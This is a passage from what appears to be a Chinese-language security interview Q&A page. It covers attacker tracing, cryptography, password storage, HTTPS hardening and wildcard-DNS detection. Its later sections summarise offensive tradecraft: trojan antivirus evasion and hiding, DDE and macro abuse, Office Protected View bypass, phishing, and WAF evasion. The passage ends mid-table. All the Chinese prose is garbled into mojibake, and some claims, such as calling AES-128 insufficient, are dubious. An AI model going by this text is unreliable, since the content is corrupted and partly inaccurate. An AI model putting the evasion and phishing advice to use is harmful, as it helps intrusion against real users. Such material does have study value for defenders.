åæŸ¥</strong>ï¼š<ul><li>é€šè¿‡ <code>whois</code> æŸ¥è¯¢æ”»å‡»è€… IP å½’å±ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois &lt;attacker_ip&gt;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>èœœç½æ•è·</strong>ï¼š<ul><li>ä½¿ç”¨ <code>T-Pot</code> èœœç½æ”¶é›†æ”»å‡»è€…è¡Œä¸ºæ¨¡å¼ã€‚</li></ul></li></ol><hr><h3 id="å›½å†…å’Œå›½å¤–æ”»å‡»ç‰¹ç‚¹æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#å›½å†…å’Œå›½å¤–æ”»å‡»ç‰¹ç‚¹æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="å›½å†…å’Œå›½å¤–æ”»å‡»ç‰¹ç‚¹æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a><strong>å›½å†…å’Œå›½å¤–æ”»å‡»ç‰¹ç‚¹æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></h3><table><thead><tr><th><strong>å¯¹æ¯”é¡¹</strong></th><th><strong>å›½å†…æ”»å‡»</strong></th><th><strong>å›½å¤–æ”»å‡»</strong></th></tr></thead><tbody><tr><td><strong>æ”»å‡»æ‰‹æ³•</strong></td><td>ä¸šåŠ¡æ»¥ç”¨ã€ä¾›åº”é“¾æ”»å‡»</td><td>APTã€é«˜çº§æ¶æ„è½¯ä»¶</td></tr><tr><td><strong>å·¥å…·</strong></td><td>å›½å†…æœ¨é©¬ã€Cobalt Strike</td><td>Metasploitã€Empire</td></tr><tr><td><strong>ç›®æ ‡</strong></td><td>é‡‘èã€ç”µå•†ã€æ”¿ä¼ç³»ç»Ÿ</td><td>åŸºç¡€è®¾æ–½ã€æ”¿åºœæœºæ„</td></tr><tr><td><strong>æ”»å‡»ç›®çš„</strong></td><td>ç»æµåˆ©ç›Šã€æ•°æ®çªƒå–</td><td>å›½å®¶çº§é—´è°æ´»åŠ¨</td></tr><tr><td><strong>æ”»å‡»æº¯æº</strong></td><td>æ”»å‡» IP å¤šå˜ï¼Œéš¾æº¯æº</td><td>APT ç»„ç»‡ç—•è¿¹æ˜æ˜¾</td></tr></tbody></table><p><strong>æ€»ç»“</strong>ï¼š</p><ul><li><strong>å›½å†…æ”»å‡»è€…</strong> åå‘äºç»æµé©±åŠ¨å‹ï¼ˆå¦‚è¯ˆéª—ã€é’“é±¼ã€æ’åº“ï¼‰ã€‚</li><li><strong>å›½å¤– APT ç»„ç»‡</strong> æ›´å€¾å‘äº <strong>é•¿æœŸæ½œä¼</strong>ï¼Œç›®æ ‡å¾€å¾€æ˜¯ <strong>æƒ…æŠ¥çªƒå–</strong>ã€‚</li></ul><hr><h3 id="å¸¸è§åŠ è§£å¯†åˆ†ç±»å’Œç®—æ³•æœ‰å“ªäº›ï¼Ÿ"><a href="#å¸¸è§åŠ è§£å¯†åˆ†ç±»å’Œç®—æ³•æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="å¸¸è§åŠ è§£å¯†åˆ†ç±»å’Œç®—æ³•æœ‰å“ªäº›ï¼Ÿ"></a><strong>å¸¸è§åŠ è§£å¯†åˆ†ç±»å’Œç®—æ³•æœ‰å“ªäº›ï¼Ÿ</strong></h3><table><thead><tr><th><strong>ç±»å‹</strong></th><th><strong>å›½é™…ç®—æ³•</strong></th><th><strong>å›½å¯†ç®—æ³•</strong></th></tr></thead><tbody><tr><td><strong>å¯¹ç§°åŠ å¯†</strong></td><td>AESã€DES</td><td>SM4</td></tr><tr><td><strong>éå¯¹ç§°åŠ å¯†</strong></td><td>RSAã€ECDSAã€ECDH</td><td>SM2</td></tr><tr><td><strong>æ¶ˆæ¯æ‘˜è¦ç®—æ³•</strong></td><td>SHA256ã€MD5</td><td>SM3</td></tr><tr><td><strong>ä¼ è¾“å±‚å®‰å…¨åè®®</strong></td><td>TLSã€SSL</td><td>TLS1.3 + å›½å¯†å•è¯ä¹¦</td></tr><tr><td><strong>å›½å¯†è¯ä¹¦</strong></td><td>sha*WithRsaEncryption</td><td>SM2-with-SM3</td></tr></tbody></table><hr><h3 id="å“ªäº›-Hash-å’ŒåŠ å¯†ç®—æ³•ä¸å»ºè®®ä½¿ç”¨ï¼Ÿ"><a href="#å“ªäº›-Hash-å’ŒåŠ å¯†ç®—æ³•ä¸å»ºè®®ä½¿ç”¨ï¼Ÿ" class="headerlink" title="å“ªäº› Hash å’ŒåŠ å¯†ç®—æ³•ä¸å»ºè®®ä½¿ç”¨ï¼Ÿ"></a><strong>å“ªäº› Hash å’ŒåŠ å¯†ç®—æ³•ä¸å»ºè®®ä½¿ç”¨ï¼Ÿ</strong></h3><p><strong>ä¸å»ºè®®ä½¿ç”¨çš„ç®—æ³•</strong>ï¼š</p><ol><li><p><strong>å·²è¢«ç ´è§£</strong>ï¼š</p><ul><li><strong>MD5</strong>ï¼ˆç¢°æ’æ”»å‡»å·²è¢«å®ç°ï¼‰</li><li><strong>SHA1</strong>ï¼ˆå·²å­˜åœ¨å®ç”¨çº§æ”»å‡»ï¼‰</li><li><strong>RC4</strong>ï¼ˆTLS å·²å¼ƒç”¨ï¼‰</li><li><strong>DES</strong>ï¼ˆå¯†é’¥é•¿åº¦è¿‡çŸ­ï¼‰</li></ul></li><li><p><strong>å®‰å…¨æ€§ä¸è¶³</strong>ï¼š</p><ul><li><strong>3DES</strong>ï¼ˆå¯†é’¥é•¿åº¦ 168-bitï¼Œä½†æ”»å‡»å¤æ‚åº¦å·²é™ä½ï¼‰</li><li><strong>RSA 1024-bit</strong>ï¼ˆå»ºè®®ä½¿ç”¨ 2048-bit æˆ–ä»¥ä¸Šï¼‰</li><li><strong>AES 128-bit</strong>ï¼ˆå¯ä½¿ç”¨ AES-256 æé«˜å®‰å…¨æ€§ï¼‰</li></ul></li></ol><p><strong>æ¨èä½¿ç”¨çš„ç®—æ³•</strong>ï¼š</p><ul><li><strong>å¯¹ç§°åŠ å¯†</strong>ï¼šAES-256</li><li><strong>éå¯¹ç§°åŠ å¯†</strong>ï¼šRSA-4096ã€ECCï¼ˆå¦‚ Curve25519ï¼‰</li><li><strong>Hash ç®—æ³•</strong>ï¼šSHA-256 åŠä»¥ä¸Š</li></ul><hr><h3 id="ç¡¬ç¼–ç å¯†é’¥å¦‚ä½•è§£å†³ï¼Ÿ"><a href="#ç¡¬ç¼–ç å¯†é’¥å¦‚ä½•è§£å†³ï¼Ÿ" class="headerlink" title="ç¡¬ç¼–ç å¯†é’¥å¦‚ä½•è§£å†³ï¼Ÿ"></a><strong>ç¡¬ç¼–ç å¯†é’¥å¦‚ä½•è§£å†³ï¼Ÿ</strong></h3><p><strong>é£é™©</strong>ï¼š</p><ul><li>ç¡¬ç¼–ç å¯†é’¥ä¼šè¢«ä»£ç å®¡è®¡å·¥å…·ï¼ˆå¦‚ <code>GitLeaks</code>ã€<code>TruffleHog</code>ï¼‰æ£€æµ‹å¹¶æ³„éœ²ã€‚</li></ul><p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>ç¯å¢ƒå˜é‡å­˜å‚¨å¯†é’¥</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> API_KEY=<span class="string">&quot;your-secret-key&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ KMSï¼ˆå¯†é’¥ç®¡ç†ç³»ç»Ÿï¼‰</strong>ï¼š<ul><li>AWS KMSã€HashiCorp Vault è¿›è¡Œå¯†é’¥ç®¡ç†</li></ul></li><li><strong>å®šæœŸè½®æ¢å¯†é’¥</strong>ï¼š<ul><li>é¿å…é•¿æœŸä½¿ç”¨åŒä¸€å¯†é’¥ï¼Œé™ä½æ³„éœ²é£é™©ã€‚</li></ul></li></ol><hr><h3 id="PKI-åŸç†"><a href="#PKI-åŸç†" class="headerlink" title="PKI åŸç†"></a><strong>PKI åŸç†</strong></h3><p><strong>PKIï¼ˆå…¬é’¥åŸºç¡€è®¾æ–½ï¼‰å·¥ä½œæœºåˆ¶</strong>ï¼š</p><ol><li><strong>å¯†é’¥å¯¹</strong>ï¼šæ¯ä¸ªç”¨æˆ·æœ‰ <strong>å…¬é’¥ + ç§é’¥</strong>ï¼ˆRSA&#x2F;ECCï¼‰ã€‚</li><li><strong>è¯ä¹¦</strong>ï¼šç”± <strong>CAï¼ˆè¯ä¹¦é¢å‘æœºæ„ï¼‰</strong> ç­¾å‘ï¼Œç¡®ä¿å…¬é’¥å¯ä¿¡ã€‚</li><li><strong>è¯ä¹¦é“¾</strong>ï¼šé€šè¿‡ <strong>æ ¹ CA -&gt; ä¸­é—´ CA -&gt; æœåŠ¡å™¨è¯ä¹¦</strong> å½¢æˆä¿¡ä»»é“¾ã€‚</li></ol><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p><ul><li><strong>SSL&#x2F;TLS</strong> è¯ä¹¦è®¤è¯ï¼ˆHTTPSï¼‰</li><li><strong>æ•°å­—ç­¾å</strong> ç¡®ä¿æ•°æ®å®Œæ•´æ€§</li></ul><hr><h3 id="å›½å¯†çš„åº•å±‚åŸç†ï¼Ÿ"><a href="#å›½å¯†çš„åº•å±‚åŸç†ï¼Ÿ" class="headerlink" title="å›½å¯†çš„åº•å±‚åŸç†ï¼Ÿ"></a><strong>å›½å¯†çš„åº•å±‚åŸç†ï¼Ÿ</strong></h3><p><strong>å›½å¯†ç®—æ³•ï¼ˆSM ç³»åˆ—ï¼‰ç‰¹ç‚¹</strong>ï¼š</p><ol><li><strong>SM2ï¼ˆéå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼š<ul><li>æ›¿ä»£ RSAï¼ŒåŸºäºæ¤­åœ†æ›²çº¿ï¼Œå¯†é’¥é•¿åº¦æ›´çŸ­ä½†æ›´å®‰å…¨ã€‚</li></ul></li><li><strong>SM3ï¼ˆå“ˆå¸Œç®—æ³•ï¼‰</strong>ï¼š<ul><li>æ›¿ä»£ SHA256ï¼Œæä¾›æ›´é«˜æŠ—ç¢°æ’æ€§ã€‚</li></ul></li><li><strong>SM4ï¼ˆå¯¹ç§°åŠ å¯†ï¼‰</strong>ï¼š<ul><li>æ›¿ä»£ AESï¼Œé€‚ç”¨äºæ•°æ®åŠ å¯†ã€‚</li></ul></li></ol><p><strong>åº”ç”¨åœºæ™¯</strong>ï¼š</p><ul><li><strong>æ”¿åºœã€é‡‘èæœºæ„</strong> éœ€ç¬¦åˆå›½å¯†æ ‡å‡†ï¼ˆå¦‚ TLS1.3 + SM2 è¯ä¹¦ï¼‰ã€‚</li></ul><hr><h3 id="å¯†ç å¦‚ä½•ä¿å­˜è‡³æ•°æ®åº“ï¼Ÿ"><a href="#å¯†ç å¦‚ä½•ä¿å­˜è‡³æ•°æ®åº“ï¼Ÿ" class="headerlink" title="å¯†ç å¦‚ä½•ä¿å­˜è‡³æ•°æ®åº“ï¼Ÿ"></a><strong>å¯†ç å¦‚ä½•ä¿å­˜è‡³æ•°æ®åº“ï¼Ÿ</strong></h3><p><strong>æœ€ä½³å®è·µ</strong>ï¼š</p><ol><li><strong>ä½¿ç”¨ PBKDF2 è¿›è¡Œå“ˆå¸Œ</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, os</span><br><span class="line">salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">password_hash = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure></li><li><strong>ä½¿ç”¨ bcrypt&#x2F;scrypt åŠ å¯†</strong>ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcrypt <span class="keyword">import</span> hashpw, gensalt</span><br><span class="line">hashed_password = hashpw(password.encode(), gensalt())</span><br></pre></td></tr></table></figure></li><li><strong>é¿å…æ˜æ–‡å­˜å‚¨</strong>ï¼š<ul><li><strong>ç¦æ­¢ä½¿ç”¨ MD5ã€SHA1 ç›´æ¥å­˜å‚¨</strong>ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•è®©å¯†ç è½®è½¬ï¼Ÿ"><a href="#å¦‚ä½•è®©å¯†ç è½®è½¬ï¼Ÿ" class="headerlink" title="å¦‚ä½•è®©å¯†ç è½®è½¬ï¼Ÿ"></a><strong>å¦‚ä½•è®©å¯†ç è½®è½¬ï¼Ÿ</strong></h3><p><strong>å¯†ç è½®è½¬ç­–ç•¥</strong>ï¼š</p><ol><li><strong>å®šæœŸæ›´æ¢å¯†é’¥</strong>ï¼š<ul><li>é‡‡ç”¨ <strong>å¯†é’¥ç‰ˆæœ¬æ§åˆ¶</strong>ï¼Œæ–°å¯†ç ä½¿ç”¨æ–°å¯†é’¥åŠ å¯†ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl enc -aes-256-cbc -e -<span class="keyword">in</span> file.txt -out file.enc -K NEW_KEY</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>åŒé‡å­˜å‚¨æœºåˆ¶</strong>ï¼š<ul><li><strong>æ–°å¯†ç  + æ—§å¯†ç å¹¶å­˜</strong>ï¼Œé¿å…ä¸€æ¬¡æ€§å…¨é‡æ›´æ–°ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store_password(user_id, new_hash, old_hash)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>è‡ªåŠ¨åŒ–ç®¡ç†</strong>ï¼š<ul><li>ä½¿ç”¨ <strong>KMSï¼ˆå¯†é’¥ç®¡ç†ç³»ç»Ÿï¼‰</strong> è¿›è¡Œå¯†é’¥ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</li></ul></li></ol><hr><h3 id="å¯ä»¥åœ¨å“ªäº›å±‚æ¬¡å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Ÿ"><a href="#å¯ä»¥åœ¨å“ªäº›å±‚æ¬¡å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Ÿ" class="headerlink" title="å¯ä»¥åœ¨å“ªäº›å±‚æ¬¡å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Ÿ"></a><strong>å¯ä»¥åœ¨å“ªäº›å±‚æ¬¡å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Ÿ</strong></h3><p><strong>åŠ å¯†å±‚æ¬¡</strong>ï¼š</p><ol><li><strong>åº”ç”¨å±‚åŠ å¯†</strong>ï¼š<ul><li>é‡‡ç”¨ <code>AES-GCM</code> åŠ å¯†æ–‡ä»¶ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line">key = Fernet.generate_key()</span><br><span class="line">cipher = Fernet(key)</span><br><span class="line">encrypted_data = cipher.encrypt(<span class="string">b&quot;secret data&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ–‡ä»¶ç³»ç»ŸåŠ å¯†</strong>ï¼š<ul><li>Linux <code>eCryptfs</code>ï¼ŒWindows <code>BitLocker</code></li></ul></li><li><strong>ç£ç›˜çº§åŠ å¯†</strong>ï¼š<ul><li>é€šè¿‡ <code>LUKS</code> åŠ å¯†æ•´ä¸ªç£ç›˜ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cryptsetup luksFormat /dev/sdX</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="å¦‚ä½•æŠ€æœ¯æ‰‹æ®µå®ç°å…¨ç«™-HTTPSï¼Ÿ"><a href="#å¦‚ä½•æŠ€æœ¯æ‰‹æ®µå®ç°å…¨ç«™-HTTPSï¼Ÿ" class="headerlink" title="å¦‚ä½•æŠ€æœ¯æ‰‹æ®µå®ç°å…¨ç«™ HTTPSï¼Ÿ"></a><strong>å¦‚ä½•æŠ€æœ¯æ‰‹æ®µå®ç°å…¨ç«™ HTTPSï¼Ÿ</strong></h3><p><strong>å…¨ç«™ HTTPS æ–¹æ¡ˆ</strong>ï¼š</p><ol><li><strong>ç”³è¯· TLS è¯ä¹¦</strong>ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot --nginx -d example.com</span><br></pre></td></tr></table></figure></li><li><strong>å¼ºåˆ¶è·³è½¬ HTTPS</strong>ï¼ˆNginx é…ç½®ï¼‰ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>å¯ç”¨ HSTSï¼ˆHTTP Strict Transport Securityï¼‰</strong>ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br></pre></td></tr></table></figure></li><li><strong>å‡çº§ä¸å®‰å…¨è¯·æ±‚</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Content-Security-Policy</code>ï¼š<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Content-Security-Policy <span class="string">&quot;upgrade-insecure-requests&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>æ£€æµ‹ HTTPS é…ç½®å®‰å…¨æ€§</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Qualys SSL Labs</code> æµ‹è¯•ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I https://www.ssllabs.com/ssltest/analyze.html?d=example.com</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h2 id="å®‰å…¨è“å†›"><a href="#å®‰å…¨è“å†›" class="headerlink" title="å®‰å…¨è“å†›"></a>å®‰å…¨è“å†›</h2><h3 id="å¦‚ä½•é€šè¿‡ç¨‹åºåˆ¤æ–­ä¸€æ‰¹åŸŸåæ˜¯å¦æ³›è§£æåŸŸåï¼Ÿ"><a href="#å¦‚ä½•é€šè¿‡ç¨‹åºåˆ¤æ–­ä¸€æ‰¹åŸŸåæ˜¯å¦æ³›è§£æåŸŸåï¼Ÿ" class="headerlink" title="å¦‚ä½•é€šè¿‡ç¨‹åºåˆ¤æ–­ä¸€æ‰¹åŸŸåæ˜¯å¦æ³›è§£æåŸŸåï¼Ÿ"></a><strong>å¦‚ä½•é€šè¿‡ç¨‹åºåˆ¤æ–­ä¸€æ‰¹åŸŸåæ˜¯å¦æ³›è§£æåŸŸåï¼Ÿ</strong></h3><p><strong>æ³›è§£ææ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ol><li><strong>æŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„å­åŸŸå</strong>ï¼š<ul><li>ä¾‹å¦‚ <code>random-subdomain.example.com</code>ï¼Œå¦‚æœè¿”å› IPï¼Œåˆ™è¯´æ˜å­˜åœ¨æ³›è§£æã€‚</li></ul></li><li><strong>æ¯”å¯¹è¿”å› IP</strong>ï¼š<ul><li>è§£æå¤šä¸ªå­åŸŸåï¼Œè‹¥ IP ä¸€è‡´ï¼Œå¯èƒ½ä¸ºæ³›è§£æã€‚</li></ul></li></ol><h2 id="Python-å®ç°ï¼š"><a href="#Python-å®ç°ï¼š" class="headerlink" title="Python å®ç°ï¼š"></a><strong>Python å®ç°</strong>ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_wildcard</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_subdomain = <span class="string">f&quot;random-test.<span class="subst">&#123;domain&#125;</span>&quot;</span></span><br><span class="line">        answer = dns.resolver.resolve(test_subdomain, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> answer.rrset <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>  <span class="comment"># æœ‰è§£æç»“æœï¼Œåˆ™ä¸ºæ³›è§£æ</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">domain_list = [<span class="string">&quot;example.com&quot;</span>, <span class="string">&quot;wildcard.example.com&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> domain_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;domain&#125;</span>: <span class="subst">&#123;<span class="string">&#x27;æ³›è§£æ&#x27;</span> <span class="keyword">if</span> is_wildcard(domain) <span class="keyword">else</span> <span class="string">&#x27;éæ³›è§£æ&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="æœ¨é©¬å…æ€æœ‰å“ªäº›æ–¹å¼ï¼Ÿå“ªç§æ–¹å¼æœ€æœ‰æ•ˆï¼Ÿ"><a href="#æœ¨é©¬å…æ€æœ‰å“ªäº›æ–¹å¼ï¼Ÿå“ªç§æ–¹å¼æœ€æœ‰æ•ˆï¼Ÿ" class="headerlink" title="æœ¨é©¬å…æ€æœ‰å“ªäº›æ–¹å¼ï¼Ÿå“ªç§æ–¹å¼æœ€æœ‰æ•ˆï¼Ÿ"></a><strong>æœ¨é©¬å…æ€æœ‰å“ªäº›æ–¹å¼ï¼Ÿå“ªç§æ–¹å¼æœ€æœ‰æ•ˆï¼Ÿ</strong></h3><p><strong>å…æ€æ–¹å¼</strong>ï¼š</p><ol><li><strong>ä»£ç æ··æ·†</strong>ï¼š<ul><li>å˜å¼‚ä»£ç ï¼Œç»•è¿‡ç‰¹å¾æ£€æµ‹ã€‚</li></ul></li><li><strong>åŠ å£³</strong>ï¼š<ul><li>ä½¿ç”¨ <code>Themida</code>ã€<code>VMProtect</code> è¿›è¡Œä¿æŠ¤ã€‚</li></ul></li><li><strong>å†…å­˜åŠ è½½</strong>ï¼š<ul><li>ä¸è½åœ°æ–‡ä»¶ï¼Œç›´æ¥åœ¨å†…å­˜è¿è¡Œã€‚</li></ul></li></ol><p><strong>æœ€æœ‰æ•ˆæ–¹å¼</strong>ï¼š</p><ul><li><strong>å†…å­˜åŠ è½½ + è‡ªå®šä¹‰åŠ å¯† + å¤šæ€å˜ç§</strong>ã€‚</li></ul><hr><h3 id="æœ¨é©¬éšè—æœ‰å“ªäº›ï¼Ÿå“ªç§éšè—æ–¹å¼å½“å‰æœ€æœ‰æ•ˆï¼Ÿ"><a href="#æœ¨é©¬éšè—æœ‰å“ªäº›ï¼Ÿå“ªç§éšè—æ–¹å¼å½“å‰æœ€æœ‰æ•ˆï¼Ÿ" class="headerlink" title="æœ¨é©¬éšè—æœ‰å“ªäº›ï¼Ÿå“ªç§éšè—æ–¹å¼å½“å‰æœ€æœ‰æ•ˆï¼Ÿ"></a><strong>æœ¨é©¬éšè—æœ‰å“ªäº›ï¼Ÿå“ªç§éšè—æ–¹å¼å½“å‰æœ€æœ‰æ•ˆï¼Ÿ</strong></h3><p><strong>å¸¸è§éšè—æ–¹å¼</strong>ï¼š</p><ol><li><strong>è¿›ç¨‹æ³¨å…¥</strong>ï¼š<ul><li>æ³¨å…¥ <code>explorer.exe</code>ï¼Œéšè—è‡ªèº«ã€‚</li></ul></li><li><strong>Rootkit æŠ€æœ¯</strong>ï¼š<ul><li>Hook <code>kernel</code> çº§å‡½æ•°ï¼Œéšè—è¿›ç¨‹ã€‚</li></ul></li><li><strong>æ— æ–‡ä»¶æ”»å‡»</strong>ï¼š<ul><li>é€šè¿‡ <code>PowerShell</code> è¿è¡Œï¼Œæ— è½åœ°æ–‡ä»¶ã€‚</li></ul></li></ol><p><strong>æœ€æœ‰æ•ˆæ–¹å¼</strong>ï¼š</p><ul><li><strong>æ— æ–‡ä»¶ + å†…å­˜é©»ç•™ + è¿›ç¨‹æ³¨å…¥</strong>ã€‚</li></ul><hr><h3 id="Word-DDE-å’Œ-Office-å®æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ"><a href="#Word-DDE-å’Œ-Office-å®æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ" class="headerlink" title="Word DDE å’Œ Office å®æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ"></a><strong>Word DDE å’Œ Office å®æœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Ÿ</strong></h3><table><thead><tr><th><strong>æ”»å‡»æ–¹å¼</strong></th><th><strong>ä¼˜åŠ¿</strong></th></tr></thead><tbody><tr><td><strong>DDEï¼ˆåŠ¨æ€æ•°æ®äº¤æ¢ï¼‰</strong></td><td>æ— éœ€å¯ç”¨å®ï¼Œå¯è‡ªåŠ¨æ‰§è¡Œå‘½ä»¤</td></tr><tr><td><strong>Office å®</strong></td><td>å¯æ‰§è¡Œæ¶æ„ VBA ä»£ç ï¼Œæƒé™è¾ƒé«˜</td></tr></tbody></table><p><strong>æœ€ä½³åˆ©ç”¨</strong>ï¼š</p><ul><li><strong>DDE å¯ç»•è¿‡å®é™åˆ¶</strong>ï¼Œé€‚ç”¨äºç›®æ ‡é˜²å¾¡è¾ƒå¼±çš„ç¯å¢ƒã€‚</li></ul><hr><h3 id="å¦‚ä½•ç»•è¿‡-Office-å—ä¿æŠ¤è§†å›¾ï¼Ÿ"><a href="#å¦‚ä½•ç»•è¿‡-Office-å—ä¿æŠ¤è§†å›¾ï¼Ÿ" class="headerlink" title="å¦‚ä½•ç»•è¿‡ Office å—ä¿æŠ¤è§†å›¾ï¼Ÿ"></a><strong>å¦‚ä½•ç»•è¿‡ Office å—ä¿æŠ¤è§†å›¾ï¼Ÿ</strong></h3><p><strong>ç»•è¿‡æ–¹å¼</strong>ï¼š</p><ol><li>**ä½¿ç”¨ <code>LNK</code> ç»“åˆ <code>VBA</code>**ï¼š<ul><li><code>.lnk -&gt; Word å® -&gt; PowerShell æ‰§è¡Œ</code>ã€‚</li></ul></li><li><strong>åµŒå…¥è¿œç¨‹ <code>RTF</code> æ–‡ä»¶</strong>ï¼š<ul><li>è§¦å‘ <code>OLE</code> æœºåˆ¶ç»•è¿‡å®‰å…¨æ£€æµ‹ã€‚</li></ul></li></ol><hr><h3 id="æœ‰å“ªäº›æœ‰æ•ˆçš„é’“é±¼æ–¹å¼ï¼Ÿ"><a href="#æœ‰å“ªäº›æœ‰æ•ˆçš„é’“é±¼æ–¹å¼ï¼Ÿ" class="headerlink" title="æœ‰å“ªäº›æœ‰æ•ˆçš„é’“é±¼æ–¹å¼ï¼Ÿ"></a><strong>æœ‰å“ªäº›æœ‰æ•ˆçš„é’“é±¼æ–¹å¼ï¼Ÿ</strong></h3><ol><li><strong>HTML Smuggling</strong>ï¼š<ul><li>ç›´æ¥ <code>JS</code> ç”Ÿæˆ <code>EXE</code>ï¼Œç»•è¿‡ä¸‹è½½æ£€æµ‹ã€‚</li></ul></li><li><strong>OAuth ä¼ªè£…</strong>ï¼š<ul><li>å‡å†’ <code>Google/Microsoft</code> ç™»å½•ï¼Œéª—å–å‡­æ®ã€‚</li></ul></li><li><strong>æ™ºèƒ½ DNS è¯±å¯¼</strong>ï¼š<ul><li>ä¼ªé€  <code>Wi-Fi</code> è®¤è¯é¡µé¢ï¼Œè·å–å‡­æ®ã€‚</li></ul></li></ol><hr><h3 id="å¦‚ä½•ç»•è¿‡-WAFã€HIDSã€å¨èƒæ„ŸçŸ¥ï¼Ÿ"><a href="#å¦‚ä½•ç»•è¿‡-WAFã€HIDSã€å¨èƒæ„ŸçŸ¥ï¼Ÿ" class="headerlink" title="å¦‚ä½•ç»•è¿‡ WAFã€HIDSã€å¨èƒæ„ŸçŸ¥ï¼Ÿ"></a><strong>å¦‚ä½•ç»•è¿‡ WAFã€HIDSã€å¨èƒæ„ŸçŸ¥ï¼Ÿ</strong></h3><table><thead><tr><th><strong>ç›®æ ‡</strong></th><th><strong>ç»•è¿‡æ–¹å¼</strong></th></tr></thead><tbody><tr><td><strong>WAF</strong></td><td>ä½¿ç”¨ <code>ç¼–ç ç»•è¿‡</code>ï¼ˆå¦‚ 